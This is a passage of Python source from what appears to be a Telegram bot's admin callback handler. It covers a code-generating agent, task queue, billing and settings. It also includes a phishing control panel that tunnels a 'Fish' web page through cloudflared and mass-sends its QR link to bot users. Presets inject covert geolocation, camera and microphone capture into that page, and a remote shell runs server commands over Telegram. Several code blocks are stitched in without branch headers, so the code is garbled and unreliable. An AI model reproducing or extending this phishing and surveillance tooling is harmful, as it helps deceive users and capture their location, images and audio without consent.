            smith_mode = arg.split(':', 1)[1]

            # Шаблоны задач для каждого режима
            SMITH_TASKS = {
                'auto':         ("Опиши задачу для АГЕНТ_СМИТ:", None),
                'scaffold':     ("Опиши что создать (название проекта, функции):", 'scaffold'),
                'patch':        ("Вставь код + описание бага для фикса:", 'patch'),
                'plan_first':   ("Опиши задачу — сначала покажу план:", 'plan_first'),
                'tg_bot':       ("Телеграм бот на python-telegram-bot v20 с командами /start /help и inline-кнопками", None),
                'aiogram_bot':  ("Telegram бот на aiogram 3.x с FSM и inline-клавиатурами, команды /start /menu", None),
                'inline_bot':   ("Telegram inline-бот который отвечает на inline-запросы (@bot текст)", None),
                'notif_bot':    ("Telegram бот который отправляет уведомления по расписанию через schedule", None),
                'fastapi':      ("FastAPI REST API с эндпоинтами CRUD, pydantic моделями и swagger docs", None),
                'flask':        ("Flask веб-приложение с роутами, шаблонами Jinja2 и REST API", None),
                'scraper':      ("Веб-парсер на requests+BeautifulSoup с сохранением в JSON и CSV", None),
                'api_client':   ("Python клиент для REST API с retry, timeout, auth и логированием", None),
                'pynput':       ("Python скрипт автоматизации клавиатуры и мыши через pynput: горячие клавиши, макросы", None),
                'pyautogui':    ("Python GUI-автоматизация через pyautogui: поиск элементов, клики, скриншоты", None),
                'scheduler':    ("Python планировщик задач через APScheduler или schedule с cron-выражениями", None),
                'desktop':      ("Python десктопный скрипт для автоматизации системных задач через psutil и subprocess", None),
                'pandas':       ("Python скрипт обработки данных: pandas read_csv/excel, фильтры, группировка, экспорт", None),
                'sqlite':       ("Python работа с SQLite: создание таблиц, CRUD операции, sqlalchemy ORM", None),
                'plots':        ("Python визуализация данных: matplotlib/seaborn графики, сохранение в PNG", None),
                'etl':          ("Python ETL pipeline: чтение источника, трансформация, загрузка в целевой формат", None),
                'crypto':       ("Python шифрование файлов и паролей через cryptography (Fernet) и hashlib", None),
                'jwt':          ("Python JWT авторизация: генерация токенов, верификация, refresh tokens", None),
                'slideshow':    ("Собери видео-слайдшоу из изображений. Пришли фото после описания задачи.", None),
                'tts_task':     ("Озвучь текст через edge-tts в mp3. Введи текст для озвучки:", None),
                'image_proc':   ("Python обработка изображений через Pillow: resize, crop, filter, convert, watermark", None),
                'audio_proc':   ("Python обработка аудио через pydub: конвертация, обрезка, merge, нормализация", None),
                'archiver':     ("Python утилита для создания и распаковки ZIP/TAR архивов с прогресс-баром", None),
                'email':        ("Python скрипт отправки email через smtplib с HTML-шаблоном и вложениями", None),
                'docker':       ("Создай Dockerfile + docker-compose.yml для Python приложения с описанием сервисов", None),
                'report':       ("Python генератор отчётов в Markdown и PDF через jinja2 + weasyprint", None),
            }

            task_text, code_mode = SMITH_TASKS.get(smith_mode, ("Опиши задачу:", None))

            # Создаём сессию
            try:
                from agent_session import create_session, STAGE_WAIT_FILES
                sess = create_session(chat_id)
                sess.task  = task_text if smith_mode not in ('auto','scaffold','patch','plan_first') else ""
                sess.stage = STAGE_WAIT_FILES
                if code_mode:
                    sess.tools_ready = [code_mode]
            except ImportError:
                pass

            if smith_mode in ('auto', 'scaffold', 'patch', 'plan_first'):
                # Ждём ввод от пользователя
                _wait_state[chat_id] = 'adm_agent_task'
                edit_message(chat_id, msg_id,
                    f"🕵️ <b>АГЕНТ_СМИТ</b> [{smith_mode}]\n\n"
                    f"{task_text}\n\n"
                    "Отправь задачу текстом:",
                    reply_markup=kb(
                        [btn("❌ Отмена", "adm:close_agent")],
                    ))
            else:
                # Задача предзаполнена — запускаем сразу или ждём файлы
                needs_files = smith_mode in ('slideshow',)

                if needs_files:
                    _wait_state[chat_id] = 'adm_agent_task'
                    edit_message(chat_id, msg_id,
                        f"🕵️ <b>АГЕНТ_СМИТ</b>\n"
                        f"Задача: <i>{task_text[:100]}</i>\n\n"
                        "📎 Отправь файлы, затем напиши <b>готово</b>",
                        reply_markup=kb(
                            [btn("🚀 Запустить без файлов", "_agent_go")],
                            [btn("❌ Отмена", "adm:close_agent")],
                        ))
                else:
                    # Запускаем сразу
                    edit_message(chat_id, msg_id,
                        f"🕵️ <b>АГЕНТ_СМИТ</b> запускается...\n"
                        f"Задача: <i>{task_text[:120]}</i>",
                        reply_markup=kb([btn("❌ Отмена","adm:close_agent")]))

                    def _run_smith(_task=task_text):
                        try:
                            from agent_session import (create_session, execute_pipeline,
                                                        close_session, STAGE_WAIT_FILES)
                            from agent_core import _llm_call
                            llm_fn = _llm_call
                        except Exception:
                            llm_fn = None
                        try:
                            from agent_session import get_session
                            s = get_session(chat_id)
                            if not s:
                                from agent_session import create_session
                                s = create_session(chat_id)
                            s.task  = _task
                            s.stage = STAGE_WAIT_FILES
                        except Exception as e:
                            send_message(f"❌ Сессия: {e}", chat_id); return

                        result = execute_pipeline(
                            s,
                            on_status=lambda m: send_message(m, chat_id),
                            llm_caller=llm_fn,
                        )
                        from telegram_client import send_document as _sd
                        import os as _os
                        for art in result.get('artifacts', []):
                            if _os.path.exists(art['path']):
                                try: _sd(art['path'], caption=f"📎 {art['name']}", chat_id=chat_id)
                                except Exception: pass
                        if result.get('zip_path') and _os.path.exists(result['zip_path']):
                            try: _sd(result['zip_path'], caption="📦 Все результаты", chat_id=chat_id)
                            except Exception: pass
                        errs = result.get('errors', [])
                        icon = "✅" if result.get('ok') else "⚠️"
                        send_message(
                            f"{icon} АГЕНТ_СМИТ завершил\n"
                            f"Артефактов: {len(result.get('artifacts',[]))}\n"
                            + (f"Ошибок: {len(errs)}" if errs else ""),
                            chat_id,
                            reply_markup=kb(
                                [btn("🕵️ Ещё задача","adm:smith_menu")],
                                [btn("◀️ Адм. меню","admin")],
                            ))
                        try:
                            from agent_session import close_session
                            close_session(chat_id)
                        except Exception: pass
                    _run_in_thread(_run_smith)
            answer_callback(cb_id, "Сессия закрыта")
            try:
                from agent_session import close_session
                close_session(chat_id)
            except ImportError:
                pass
            _wait_state.pop(chat_id, None)
            edit_message(chat_id, msg_id, "🤖 Сессия агента закрыта.",
                         reply_markup=kb([btn("◀️ Адм. меню","admin")]))

        elif arg == 'cloudflared_qr':
            answer_callback(cb_id)
            if not CF_BOT_ENABLED:
                send_message("❌ cloudflared_bot.py не найден в папке бота.", chat_id); return
            edit_message(chat_id, msg_id,
                "📡 <b>Cloudflared Tunnel + QR</b>\n\n"
                "Запустит туннель → получит URL → создаст QR →\n"
                "отправит выбранным пользователям\n\n"
                "Выбери порт:",
                reply_markup=kb(
                    [btn("🌐 Порт Fish (web)", f"adm:cf_start:{_fish_cfg.SERVER_PORT}")],
                    [btn("🌐 Порт Admin panel", "adm:cf_start:8080")],
                    [btn("🔴 Остановить туннель", "cf_stop"),
                     btn("◀️ Назад", "admin")],
                ))

        elif arg.startswith('cf_start:'):
            answer_callback(cb_id)
            port = int(arg.split(':')[1])
            edit_message(chat_id, msg_id, f"🌐 Запускаю cloudflared на порту {port}...")
            def _cf_start(_port=port, _cid=chat_id):
                if CF_BOT_ENABLED:
                    handle_cloudflared_command(_cid, port=_port)
            _run_in_thread(_cf_start)

        elif arg == 'cfqr_menu':
            answer_callback(cb_id)
            try:
                from cloudflared_qr_bot import get_tunnel_url
                url = get_tunnel_url()
                st  = f"🟢 <code>{url}</code>" if url else "🔴 Не запущен"
            except ImportError:
                st = "⚠️ Модуль не найден"
            edit_message(chat_id, msg_id,
                f"☁️ <b>Cloudflared QR</b>\n\nСтатус: {st}",
                reply_markup=kb(
                    [btn("🚀 Запуск nginx:80 (рекомендуется)", "adm:cfqr:start:80"),
                     btn("🚀 Запуск admin:8080",  "adm:cfqr:start:8080")],
                    [btn(f"🚀 Запуск fish:{_fish_cfg.SERVER_PORT}", f"adm:cfqr:start:{_fish_cfg.SERVER_PORT}")],
                    [btn("📱 Генерить QR",         "adm:cfqr:gen_qr"),
                     btn("📤 Разослать юзерам",   "adm:cfqr:send_users")],
                    [btn("🔗 Показать URL",        "adm:cfqr:show_url"),
                     btn("⏹ Остановить",          "adm:cfqr:stop")],
                    [btn("◀️ Адм. меню",           "admin")],
                ))

        elif arg.startswith('cfqr:'):
            answer_callback(cb_id)
            cfarg = arg[5:]  # убираем 'cfqr:'
            try:
                from cloudflared_qr_bot import (start_cloudflared, stop_cloudflared,
                                                 get_tunnel_url, generate_qr)
            except ImportError as e:
                send_message(f"❌ cloudflared_qr_bot: {e}", chat_id); return

            if cfarg.startswith('start:'):
                port = int(cfarg.split(':')[1])
                send_message(f"☁️ Запускаю cloudflared на порту {port}...", chat_id)
                def _cf_start(p=port):
                    ok, result = start_cloudflared(p)
                    if ok:
                        try:
                            qr_path = generate_qr(result, "BlackBugsAI Tunnel")
                            send_document(qr_path,
                                caption=f"☁️ <b>Туннель активен</b>\n<code>{result}</code>",
                                chat_id=chat_id)
                        except Exception:
                            send_message(f"☁️ <b>Туннель активен</b>\n<code>{result}</code>", chat_id)
                        send_message("📤 Нажми 'Разослать юзерам' чтобы отправить QR", chat_id,
                                     reply_markup=kb([btn("📤 Разослать QR","adm:cfqr:send_users"),
                                                      btn("◀️ Меню CF","adm:cfqr_menu")]))
                    else:
                        send_message(result, chat_id)
                _run_in_thread(_cf_start)

            elif cfarg == 'stop':
                stop_cloudflared()
                send_message("⏹ Туннель остановлен", chat_id,
                             reply_markup=kb([btn("◀️ CF меню","adm:cfqr_menu")]))

            elif cfarg == 'show_url':
                url = get_tunnel_url()
                send_message(f"🔗 <code>{url}</code>" if url else "🔴 Не запущен", chat_id)

            elif cfarg == 'gen_qr':
                url = get_tunnel_url()
                if not url:
                    send_message("❌ Сначала запусти туннель!", chat_id,
                                 reply_markup=kb([btn("🚀 Запустить","adm:cfqr:start:8080")])); return
                def _gen():
                    try:
                        qr_path = generate_qr(url, "BlackBugsAI")
                        send_document(qr_path, caption=f"📱 QR\n<code>{url}</code>", chat_id=chat_id)
                    except Exception as e:
                        send_message(f"❌ QR ошибка: {e}\npip install qrcode[pil]", chat_id)
                _run_in_thread(_gen)

            elif cfarg == 'send_users':
                url = get_tunnel_url()
                if not url:
                    send_message("❌ Сначала запусти туннель!", chat_id,
                                 reply_markup=kb([btn("🚀 Запустить","adm:cfqr:start:8080")])); return
                users = get_all_users()
                active = [u for u in users if u.get('privilege') not in ('banned',)
                          and u.get('status') != 'banned']
                if not active:
                    send_message("👥 Нет активных пользователей", chat_id); return
                rows = []
                for u in active[:15]:
                    name = (u.get('first_name') or u.get('username') or str(u['telegram_id']))[:20]
                    icon = PRIVILEGE_ICONS.get(u.get('privilege','user'),'👤')
                    rows.append([btn(f"{icon} {name}", f"adm:cfqr:to:{u['telegram_id']}")])
                rows.append([btn("📣 Всем активным", "adm:cfqr:all")])
                rows.append([btn("◀️ Назад","adm:cfqr_menu")])
                edit_message(chat_id, msg_id,
                    "📤 <b>Кому отправить QR?</b>",
                    reply_markup={"inline_keyboard": rows})

            elif cfarg.startswith('to:'):
                target = cfarg.split(':')[1]
                url = get_tunnel_url()
                def _send_one(tid=target, u_url=url):
                    try:
                        qr_path = generate_qr(u_url, "BlackBugsAI")
                        send_document(qr_path,
                            caption=f"☁️ <b>Ссылка</b>\n<code>{u_url}</code>",
                            chat_id=tid)
                        u = get_user(tid)
                        name = (u.get('first_name') or str(tid)) if u else tid
                        send_message(f"✅ QR отправлен: <b>{name}</b>", chat_id)
                    except Exception as e:
                        send_message(f"⚠️ Ошибка: {e}", chat_id)
                _run_in_thread(_send_one)

            elif cfarg == 'all':
                url = get_tunnel_url()
                users = [u for u in get_all_users()
                         if u.get('privilege') not in ('banned',) and u.get('status') != 'banned']
                send_message(f"📣 Отправляю {len(users)} пользователям...", chat_id)
                def _send_all():
                    try:
                        qr_path = generate_qr(url, "BlackBugsAI")
                    except Exception as e:
                        send_message(f"❌ QR: {e}", chat_id); return
                    ok = fail = 0
                    for u in users:
                        try:
                            send_document(qr_path,
                                caption=f"☁️ <b>Ссылка</b>\n<code>{url}</code>",
                                chat_id=str(u['telegram_id']))
                            ok += 1; time.sleep(0.05)
                        except Exception:
                            fail += 1
                    send_message(f"✅ {ok} отправлено | ❌ {fail} ошибок", chat_id,
                                 reply_markup=kb([btn("◀️ CF меню","adm:cfqr_menu")]))
                _run_in_thread(_send_all)

        else:
            answer_callback(cb_id, f"❓ Неизвестное adm: {arg}", alert=True)

    # ══════════════════════════════════════════════════════════
    #  ТИП АГЕНТА (3 режима)
    # ══════════════════════════════════════════════════════════
    elif action == 'agent_type':
        answer_callback(cb_id)
        atype = arg or 'assistant'
        if USER_SETTINGS_ENABLED:
            set_setting(chat_id, 'agent_type', atype)
        info = AGENT_TYPES.get(atype, {})
        icon = info.get('icon','🤖')
        name = info.get('name', atype)
        desc = info.get('desc','')
        # Запускаем сессию с нужным системным промтом
        start_session(chat_id, 'chat')
        edit_message(chat_id, msg_id,
            f"{icon} <b>{name}</b>\n<i>{desc}</i>\n\n"
            f"Сессия активна. Пиши задачу — я помогу.\n"
            f"Модель: <b>{config.LLM_PROVIDER} / {config.LLM_MODEL}</b>",
            reply_markup=kb(
                [btn(f"💬 Начать разговор",    "agent_chat_start"),
                 btn(f"⚙️ Сменить тип",        "user_settings")],
                [btn(f"📋 Задачи в очередь",   "tasks:list"),
                 btn(f"◀️ Меню",               "menu")],
            ))

    # ══════════════════════════════════════════════════════════
    #  ОЧЕРЕДЬ ЗАДАЧ
    # ══════════════════════════════════════════════════════════
    elif action == 'tasks':
        answer_callback(cb_id)
        if not QUEUE_ENABLED:
            send_message("❌ Очередь задач не загружена.", chat_id); return

        if arg == 'list':
            can_all = has_perm(chat_id, 'view_all_tasks') if ROLES_ENABLED else False
            tasks = get_all_tasks(30) if can_all else get_user_tasks(chat_id, 20)
            stats = queue_stats()
            stats_str = "  ".join(f"{s}:{n}" for s,n in stats.items())
            text = f"📋 <b>Задачи</b>  [{stats_str}]\n\n{format_task_list(tasks)}"
            rows = []
            for t in tasks[:5]:
                rows.append([btn(f"{'✅❌⏳▶️🚫'[['done','failed','pending','running','cancelled'].index(t['status']) if t['status'] in ['done','failed','pending','running','cancelled'] else 2]} {t.get('title','?')[:30]}",
                                 f"tasks:info:{t['id']}")])
            rows.append([btn("🔄 Обновить","tasks:list"), btn("◀️ Меню","menu")])
            edit_message(chat_id, msg_id, text, reply_markup=kb(*rows))

        elif arg.startswith('info:'):
            tid = arg.split(':',1)[1]
            task = get_task(tid)
            if not task:
                send_message("❌ Задача не найдена", chat_id); return
            from task_queue import STATUS_ICON
            icon = STATUS_ICON.get(task['status'],'?')
            arts = get_task_artifacts(tid)
            text = (
                f"{icon} <b>{task.get('title','?')}</b>\n"
                f"ID: <code>{task['id']}</code> | Тип: <code>{task.get('type','?')}</code>\n"
                f"Статус: <b>{task['status']}</b>\n"
                f"Создана: {(task.get('created_at',''))[:16]}\n"
            )
            if task.get('result'): text += f"\n📄 Результат:\n{task['result'][:600]}"
            if task.get('error'):  text += f"\n❌ Ошибка:\n<code>{task['error'][:300]}</code>"
            rows = []
            if arts:
                rows.append([btn(f"📎 Файлы ({len(arts)})", f"tasks:arts:{tid}")])
            if task['status'] in ('failed','cancelled'):
                rows.append([btn("🔄 Повторить", f"tasks:retry:{tid}")])
            if task['status'] in ('pending','running'):
                rows.append([btn("🚫 Отменить", f"tasks:cancel:{tid}")])
            rows.append([btn("◀️ К списку","tasks:list")])
            edit_message(chat_id, msg_id, text, reply_markup=kb(*rows))

        elif arg.startswith('arts:'):
            tid = arg.split(':',1)[1]
            arts = get_task_artifacts(tid)
            if not arts:
                send_message("📭 Нет артефактов для этой задачи.", chat_id); return
            send_message(f"📎 Артефакты задачи <code>{tid}</code>:", chat_id)
            from telegram_client import send_document
            for art in arts[:10]:
                if os.path.exists(art.get('path','')):
                    send_document(art['path'], caption=f"📎 {art['name']}", chat_id=chat_id)

        elif arg.startswith('retry:'):
            tid = arg.split(':',1)[1]
            ok, msg2 = retry_task(tid, chat_id)
            answer_callback(cb_id, msg2, alert=not ok)
            if ok: send_message(f"🔄 Задача <code>{tid}</code> поставлена повторно.", chat_id,
                                 reply_markup=kb([btn("📋 Задачи","tasks:list")]))

        elif arg.startswith('cancel:'):
            tid = arg.split(':',1)[1]
            ok, msg2 = cancel_task(tid, chat_id)
            answer_callback(cb_id, msg2, alert=not ok)
            if ok: send_message(f"🚫 Задача <code>{tid}</code> отменена.", chat_id,
                                 reply_markup=kb([btn("📋 Задачи","tasks:list")]))

        elif arg == 'artifacts':
            from task_queue import get_user_artifacts
            arts = get_user_artifacts(chat_id)
            if not arts:
                edit_message(chat_id, msg_id, "📭 У тебя нет артефактов.",
                             reply_markup=kb([btn("◀️ Меню","menu")])); return
            lines = [f"📎 <b>Твои файлы ({len(arts)})</b>\n"]
            for a in arts[:20]:
                size = f"{a['size_bytes']//1024}KB" if a.get('size_bytes') else '?'
                lines.append(f"• <code>{a['name']}</code>  {size}  <code>{a['id']}</code>")
            edit_message(chat_id, msg_id, "\n".join(lines),
                         reply_markup=kb([btn("◀️ Меню","menu")]))

    # ══════════════════════════════════════════════════════════
    #  НАСТРОЙКИ ПОЛЬЗОВАТЕЛЯ
    # ══════════════════════════════════════════════════════════
    elif action == 'user_settings':
        answer_callback(cb_id)
        if not USER_SETTINGS_ENABLED:
            send_message("❌ user_settings не загружен.", chat_id); return
        s = get_settings(chat_id)
        atype = s.get('agent_type','assistant')
        at    = AGENT_TYPES.get(atype,{})
        llm   = get_user_llm(chat_id)
        text  = (
            f"⚙️ <b>Мои настройки</b>\n\n"
            f"🤖 Тип агента: <b>{at.get('icon','')} {at.get('name',atype)}</b>\n"
            f"🧠 LLM: <b>{llm['provider']} / {llm['model']}</b>\n"
            f"🎙 TTS: <b>{s.get('tts_voice') or config.TTS_VOICE}</b>\n"
            f"🏖 Sandbox: <b>{'вкл' if s.get('sandbox_on',1) else 'выкл'}</b>\n"
            f"💬 Язык: <b>{s.get('lang','ru')}</b>\n"
        )
        edit_message(chat_id, msg_id, text,
            reply_markup=kb(
                [btn("🤖 Тип агента",      "uset:agent_type"),
                 btn("🧠 Сменить LLM",     "uset:llm")],
                [btn("🏖 Sandbox вкл/выкл","uset:sandbox"),
                 btn("✏️ Свой промт",      "uset:prompt")],
                [btn("🧠 Память",          "uset:memory"),
                 btn("🗑 Сбросить память", "uset:clear_memory")],
                [btn("◀️ Меню", "menu")],
            ))

    elif action == 'uset':
        answer_callback(cb_id)
        if not USER_SETTINGS_ENABLED:
            send_message("❌ user_settings не загружен.", chat_id); return
        if arg == 'agent_type':
            atype = get_agent_type(chat_id)
            edit_message(chat_id, msg_id,
                "🤖 <b>Выбери тип агента:</b>",
                reply_markup=agent_type_keyboard(atype))
        elif arg == 'llm':
            edit_message(chat_id, msg_id,
                "🧠 <b>Выбери LLM провайдера:</b>\n<i>Глобальная настройка или своя</i>",
                reply_markup=llm_keyboard())
        elif arg == 'sandbox':
            s = get_settings(chat_id)
            cur = s.get('sandbox_on', 1)
            new = 0 if cur else 1
            set_setting(chat_id, 'sandbox_on', new)
            send_message(f"🏖 Sandbox: <b>{'включён' if new else 'выключен'}</b>", chat_id,
                         reply_markup=kb([btn("◀️ Настройки","user_settings")]))
        elif arg == 'prompt':
            _wait_state[chat_id] = 'user_custom_prompt'
            send_message("✏️ Введи свой системный промт для агента:", chat_id,
                         reply_markup=kb([btn("❌ Отмена","user_settings")]))
        elif arg == 'memory':
            send_message(format_memory(chat_id), chat_id,
                         reply_markup=kb([btn("🗑 Очистить","uset:clear_memory"),
                                          btn("◀️ Назад","user_settings")]))
        elif arg == 'clear_memory':
            clear_memory(chat_id)
            send_message("🗑 Память очищена.", chat_id,
                         reply_markup=kb([btn("◀️ Настройки","user_settings")]))

    elif action == 'cf_send':
        answer_callback(cb_id)
        if not CF_BOT_ENABLED:
            send_message("❌ cloudflared_bot не загружен", chat_id); return
        if arg == 'all':
            send_message("📣 Отправляю QR всем...", chat_id)
            _run_in_thread(lambda: send_qr_to_all(chat_id))
        else:
            try:
                target = int(arg)
                send_qr_to_user(target, chat_id)
                send_message(f"✅ QR отправлен пользователю <code>{target}</code>", chat_id)
            except (ValueError, Exception) as e:
                send_message(f"❌ Ошибка: {e}", chat_id)

    elif action == 'cf_stop':
        answer_callback(cb_id, "Останавливаю туннель...")
        if CF_BOT_ENABLED:
            cf_bot.stop()
            edit_message(chat_id, msg_id, "🔴 <b>Tunnel остановлен</b>")
        else:
            send_message("❌ cloudflared_bot не загружен", chat_id)
        # Кнопка "Готово — запустить"
        answer_callback(cb_id)
        _handle_input('adm_agent_task', 'готово', chat_id)
        answer_callback(cb_id, f"✅ Тип: {arg}")
        if USER_SETTINGS_ENABLED:
            set_setting(chat_id, 'agent_type', arg)
        at = AGENT_TYPES.get(arg,{})
        edit_message(chat_id, msg_id,
            f"{at.get('icon','🤖')} <b>Агент: {at.get('name',arg)}</b>\nТип установлен.",
            reply_markup=kb([btn("💬 Начать","agent_chat_start"),
                             btn("◀️ Меню","menu")]))

    elif action == 'vision':
        # vision:file_id:mode
        parts    = arg.split(':', 1)
        file_id  = parts[0]
        mode     = parts[1] if len(parts) > 1 else 'describe'
        answer_callback(cb_id)

        if mode == 'qa':
            _wait_state[chat_id] = f'vision_qa:{file_id}'
            edit_message(chat_id, msg_id, "❓ Введи вопрос про изображение:",
                         reply_markup=kb([btn("❌ Отмена", "menu")]))
            return

        send_message(f"👁 Анализирую ({mode})...", chat_id)
        def _do_vision(fid=file_id, m=mode):
            try:
                from agent_tools_registry import tool_vision_telegram
                result = tool_vision_telegram({'file_id': fid, 'mode': m}, chat_id=chat_id)
                import re; clean = re.sub(r'<[^>]+>', '', result)
                send_message(clean[:3500], chat_id,
                             reply_markup=kb([btn("◀️ Меню", "menu")]))
            except Exception as e:
                send_message(f"❌ {e}", chat_id)
        _run_in_thread(_do_vision)

    elif action == 'billing':
        answer_callback(cb_id)
        bm = BillingManager(chat_id)
        if arg == 'status' or not arg:
            edit_message(chat_id, msg_id,
                bm.format_status(),
                reply_markup=bm.billing_keyboard() or kb([btn("◀️ Меню","menu")]))
        elif arg.startswith('upgrade:'):
            plan = arg.split(':',1)[1]
            plan_cfg = config.get_plan(plan)
            price = plan_cfg.get('price', 0)
            edit_message(chat_id, msg_id,
                f"⭐ <b>Upgrade до {plan_cfg.get('name', plan)}</b>\n\n"
                f"Цена: <b>${price}/мес</b>\n\n"
                f"Для оплаты напишите: @blackbugsai_support\n"
                f"Или оплатите через Telegram Stars.",
                reply_markup=kb(
                    [btn("💬 Написать в поддержку", "billing:support")],
                    [btn("◀️ Назад", "billing:status")],
                ))
        elif arg == 'history':
            try:
                from billing import _db
                with _db() as c:
                    rows = c.execute(
                        'SELECT type, amount, description, created_at FROM transactions '
                        'WHERE user_id=? ORDER BY created_at DESC LIMIT 10',
                        (chat_id,)).fetchall()
                if rows:
                    lines = ["💳 <b>История транзакций:</b>\n"]
                    for r in rows:
                        ts = str(r[3] or '')[:16].replace('T',' ')
                        icon = {'purchase':'💰','spend':'💸','bonus':'🎁'}.get(r[0],'•')
                        lines.append(f"{icon} {ts}: {r[0]} {r[1]:+.2f} {r[2] or ''}")
                    text_out = "\n".join(lines)
                else:
                    text_out = "📭 История транзакций пуста."
            except Exception as e:
                text_out = f"❌ {e}"
            edit_message(chat_id, msg_id, text_out,
                         reply_markup=kb([btn("◀️ Назад","billing:status")]))
        elif arg == 'buy_credits':
            edit_message(chat_id, msg_id,
                "💰 <b>Купить кредиты</b>\n\n"
                "• 100 кредитов — $1\n"
                "• 500 кредитов — $4\n"
                "• 2000 кредитов — $14\n\n"
                "Для покупки: @blackbugsai_support",
                reply_markup=kb([btn("◀️ Назад","billing:status")]))

    elif action == 'run':
        answer_callback(cb_id, "🚀 Запускаю полный цикл...")
        def _do_run():
            try:
                scheduled_cycle()
                send_message("✅ Цикл завершён", chat_id,
                             reply_markup=menu_keyboard(chat_id))
            except Exception as e:
                send_message(f"❌ Ошибка цикла: {e}", chat_id)
        _run_in_thread(_do_run)

    elif action == 'parse':
        answer_callback(cb_id, "📡 Парсинг...")
        def _do_parse():
            try:
                articles = parse_all()
                send_message(
                    f"✅ Парсинг завершён\n"
                    f"Найдено статей: <b>{len(articles) if articles else 0}</b>",
                    chat_id, reply_markup=menu_keyboard(chat_id))
            except Exception as e:
                send_message(f"❌ Ошибка парсинга: {e}", chat_id)
        _run_in_thread(_do_parse)
        # arg: geo | cam | mic | all — быстрый выбор пресета
        answer_callback(cb_id)
        if not FISH_ENABLED:
            send_message("❌ Фишинг не загружен", chat_id); return
        presets = {
            'geo':  {'inject_geo': True,   'inject_camera': False, 'inject_mic': False},
            'cam':  {'inject_geo': False,  'inject_camera': True,  'inject_mic': False},
            'mic':  {'inject_geo': False,  'inject_camera': False, 'inject_mic': True},
            'all':  {'inject_geo': True,   'inject_camera': True,  'inject_mic': True},
        }
        opts = presets.get(arg, {})
        if opts and FISH_ENABLED:
            try:
                import fish_bot_state as _fbs
                for k, v in opts.items():
                    setattr(_fbs, k, v)
                names = {'geo':'📍 Гео', 'cam':'📸 Камера', 'mic':'🎤 Микрофон', 'all':'📦 Всё'}
                send_message(f"✅ Пресет <b>{names.get(arg, arg)}</b> применён",
                             chat_id, reply_markup=fish_menu_keyboard())
            except Exception as e:
                send_message(f"⚠️ {e}", chat_id)

    elif action == 'llm_discover':
        answer_callback(cb_id)
        send_message("🔍 Проверяю все провайдеры...", chat_id)
        def _do_discover():
            try:
                from llm_checker import check_all_providers
                import os
                env = dict(os.environ)
                results = check_all_providers(env)
                from llm_client import format_check_results
                send_message(format_check_results(results)[:4000], chat_id)
            except Exception as e:
                send_message(f"❌ {e}", chat_id)
        _run_in_thread(_do_discover)
        answer_callback(cb_id)
        if CFQR_ENABLED:
            handle_cfqr_callback(data, chat_id, cb_id)
        else:
            send_message("❌ cloudflare_qr_bot не загружен", chat_id)

    elif action == '_agent_go':
        answer_callback(cb_id)
        try:
            from agent_session import get_session
            sess = get_session(chat_id)
            if sess and sess.task:
                _run_code_pipeline(chat_id, sess)
            else:
                send_message("❌ Нет активной задачи. Опиши задачу сначала.", chat_id)
        except Exception as e:
            send_message(f"❌ {e}", chat_id)

    elif action == 'matrix_stop':
        answer_callback(cb_id)
        _wait_state.pop(chat_id, None)
        edit_message(chat_id, msg_id,
            '🟥 MATRIX сессия завершена.',
            reply_markup=kb([btn('🟥 Новая задача', 'matrix_start'),
                             btn('◀️ Меню', 'menu')]))

    # ── REMOTE CONTROL ────────────────────────────────────────────────────────
    elif action == 'rc_menu':
        answer_callback(cb_id)
        if not RC_ENABLED:
            send_message('❌ Remote Control не загружен', chat_id); return
        if role not in ('god', 'adm'):
            send_message('❌ Только ADM+', chat_id); return
        edit_message(chat_id, msg_id,
            '🖥 <b>Remote Control</b>\n\nУправление сервером через Telegram.',
            reply_markup=kb(
                [btn('💻 Shell', 'rc_shell'), btn('📊 Мониторинг', 'rc_stats')],
                [btn('🐳 Docker', 'rc_docker'), btn('🔧 PTY-отладка', 'rc_pty')],
                [btn('◀️ Меню', 'menu')]
            ))

    elif action == 'rc_shell':
        answer_callback(cb_id)
        if role not in ('god', 'adm'): return
        sess = get_session(str(chat_id))
        _wait_state[chat_id] = 'rc_shell'
        send_message(
            f'💻 <b>Shell</b> — <code>{sess.get_prompt()}</code>\n\n'
            f'Вводи команды. <code>/exit</code> — выход.\n'
            f'{"GOD: все команды" if role == "god" else "ADM: whitelist команд"}',
            chat_id,
            reply_markup=kb(
                [btn('📊 top', 'rc_cmd:top -bn1 | head -20'),
                 btn('📁 ls -la', 'rc_cmd:ls -la')],
                [btn('🐳 docker ps', 'rc_cmd:docker ps'),
                 btn('📋 df -h', 'rc_cmd:df -h')],
                [btn('🖥 RC Меню', 'rc_menu'), btn('◀️ Меню', 'menu')]
            ))

    elif action.startswith('rc_cmd:'):
        answer_callback(cb_id)
        if role not in ('god', 'adm'): return
        cmd = action[7:]
        allowed, reason = check_command_allowed(cmd, is_god=(role=='god'))
        if not allowed:
            send_message(f'❌ {reason}', chat_id); return
        sess = get_session(str(chat_id))
        ok, out = sess.run(cmd)
        icon = '✅' if ok else '❌'
        send_message(
            f'<code>{sess.get_prompt()}{cmd}</code>\n\n{icon}\n<pre>{out[:3500]}</pre>',
            chat_id,
            reply_markup=kb([btn('🖥 RC Меню', 'rc_menu')]))

    elif action == 'rc_stats':
        answer_callback(cb_id)
        if role not in ('god', 'adm'): return
        info = get_system_info()
        text = format_system_info(info)
        # Docker stats
        try:
            docker_st = docker_stats()
            text += '\n\n' + docker_st
        except Exception:
            pass
        send_message(text, chat_id,
            reply_markup=kb(
                [btn('🔄 Обновить', 'rc_stats'), btn('🖥 RC Меню', 'rc_menu')]))

    elif action == 'rc_docker':
        answer_callback(cb_id)
        if role not in ('god', 'adm'): return
        containers = docker_list()
        text = format_docker_list(containers)
        rows = [[btn('🔄 Обновить', 'rc_docker')]]
        for c in containers[:6]:
            name = c['name']
            if c['running']:
                rows.append([
                    btn(f'⏹ {name}', f'rc_docker_stop:{name}'),
                    btn(f'🔄 {name}', f'rc_docker_restart:{name}'),
                    btn(f'📋 logs', f'rc_docker_logs:{name}'),
                ])
            else:
                rows.append([
                    btn(f'▶️ {name}', f'rc_docker_start:{name}'),
                    btn(f'🗑 {name}', f'rc_docker_rm:{name}'),
                ])
        rows.append([btn('🖥 RC Меню', 'rc_menu')])
        edit_message(chat_id, msg_id, text, reply_markup=kb(*rows))

    elif action.startswith('rc_docker_'):
        answer_callback(cb_id)
        if role not in ('god', 'adm'): return
        parts = action.split(':', 1)
        if len(parts) < 2: return
        act_raw = parts[0].replace('rc_docker_', '')
        container = parts[1]
        ok, out = docker_action(container, act_raw)
        icon = '✅' if ok else '❌'
        send_message(
            f'{icon} docker {act_raw} <code>{container}</code>\n\n<pre>{out[:2000]}</pre>',
            chat_id,
